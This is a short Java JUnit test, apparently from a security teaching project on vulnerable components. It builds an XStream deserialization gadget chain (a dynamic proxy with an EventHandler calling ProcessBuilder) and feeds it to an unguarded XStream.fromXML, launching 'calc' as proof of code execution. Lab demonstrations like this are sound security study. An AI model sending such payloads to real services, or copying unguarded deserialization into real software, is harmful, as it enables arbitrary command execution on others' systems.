package org.bewhale.javasec.controller.componentsvul;

import com.thoughtworks.xstream.XStream;
import org.junit.jupiter.api.Test;

class XstreamTest {

    @Test
    void vul() {
        StringBuilder sb = new StringBuilder().append("<sorted-set>")
                .append("<string>foo</string>")
                .append("<dynamic-proxy>")
                .append("    <interface>java.lang.Comparable</interface>")
                .append("    <handler class=\"java.beans.EventHandler\">")
                .append("        <target class=\"java.lang.ProcessBuilder\">")
                .append("            <command>")
                .append("                <string>calc</string>")
                .append("            </command>")
                .append("        </target>")
                .append("        <action>start</action>")
                .append("    </handler>")
                .append("</dynamic-proxy>")
                .append("</sorted-set>");
        XStream xs = new XStream();
        xs.fromXML(String.valueOf(sb));
    }
}